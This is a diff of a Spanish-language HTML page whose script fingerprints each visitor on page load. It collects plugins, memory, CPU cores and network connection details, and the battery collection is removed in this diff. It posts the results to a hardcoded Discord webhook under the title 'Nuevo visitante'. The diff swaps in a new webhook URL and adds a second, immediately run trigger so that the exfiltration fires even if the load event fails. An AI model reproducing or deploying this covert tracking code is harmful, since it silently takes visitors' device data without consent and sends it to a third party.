@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Hola</title>
+  <title>Parpadeo</title>
   <style>
     * {
       margin: 0;
@@ -147,24 +147,6 @@
       }
     }
 
-    // Obtener batería (sin permisos, solo si está disponible)
-    function getBattery() {
-      return new Promise((resolve) => {
-        if (navigator.getBattery) {
-          navigator.getBattery().then(battery => {
-            resolve({
-              level: Math.round(battery.level * 100) + '%',
-              charging: battery.charging ? 'Sí' : 'No'
-            });
-          }).catch(() => {
-            resolve({ level: 'No disponible', charging: 'No disponible' });
-          });
-        } else {
-          resolve({ level: 'No disponible', charging: 'No disponible' });
-        }
-      });
-    }
-
     // Obtener conexión de red (sin permisos)
     function getConnection() {
       try {
@@ -190,7 +172,6 @@
       const plugins = getPlugins();
       const memory = getMemory();
       const cores = getCores();
-      const battery = await getBattery();
       const connection = getConnection();
 
       const data = {
@@ -200,7 +181,6 @@
         plugins: plugins,
         memory: memory,
         cores: cores,
-        battery: battery,
         connection: connection,
         timestamp: new Date().toISOString()
       };
@@ -211,7 +191,7 @@
     // Función para enviar a Discord mediante webhook
     async function sendToDiscord(data) {
       // CAMBIA ESTA URL POR LA DE TU WEBHOOK DE DISCORD
-      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1540874149436596365/aUQaFvSdewMu1KrLQpDgP2kGbuA5_nqlemTi08xS3ISm0d-E-8u-ksLBmRDFlt11vyzq';
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1352504992581689414/ksDEYv3ICIOtlK6PqqBekdVCgb-bpWmhwaQ8cQ2gR_YlVf0OjSl41N7CpwRI32Lm1SWq';
 
       const embed = {
         title: '📊 Nuevo visitante',
@@ -288,11 +268,6 @@
             inline: true
           },
           {
-            name: '🔋 Batería',
-            value: `Nivel: ${data.battery.level}\nCargando: ${data.battery.charging}`,
-            inline: true
-          },
-          {
             name: '📶 Conexión',
             value: `Tipo: ${data.connection.type}\nVelocidad: ${data.connection.downlink}\nRTT: ${data.connection.rtt}`,
             inline: false
@@ -308,6 +283,7 @@
       };
 
       try {
+        console.log('Enviando datos a Discord...');
         const response = await fetch(WEBHOOK_URL, {
           method: 'POST',
           headers: {
@@ -317,23 +293,40 @@
         });
 
         if (!response.ok) {
-          console.error('Error enviando a Discord:', response.status);
+          const errorText = await response.text();
+          console.error('Error enviando a Discord - Status:', response.status, 'Mensaje:', errorText);
+          throw new Error(`HTTP error! status: ${response.status}`);
+        } else {
+          console.log('✅ Datos enviados a Discord correctamente');
         }
       } catch (error) {
-        console.error('Error en la petición a Discord:', error);
+        console.error('❌ Error en la petición a Discord:', error.message);
       }
     }
 
     // Ejecutar cuando la página cargue
     window.addEventListener('load', async () => {
       try {
+        console.log('Iniciando recolección de datos...');
         const data = await collectData();
         console.log('Datos recolectados:', data);
         await sendToDiscord(data);
       } catch (error) {
-        console.error('Error en el proceso:', error);
+        console.error('❌ Error en el proceso:', error);
       }
     });
+
+    // También ejecutar inmediatamente por si el evento load falla
+    (async function init() {
+      try {
+        console.log('Iniciando recolección de datos (immediate)...');
+        const data = await collectData();
+        console.log('Datos recolectados (immediate):', data);
+        await sendToDiscord(data);
+      } catch (error) {
+        console.error('❌ Error en el proceso (immediate):', error);
+      }
+    })();
   </script>
 </body>
 </html>
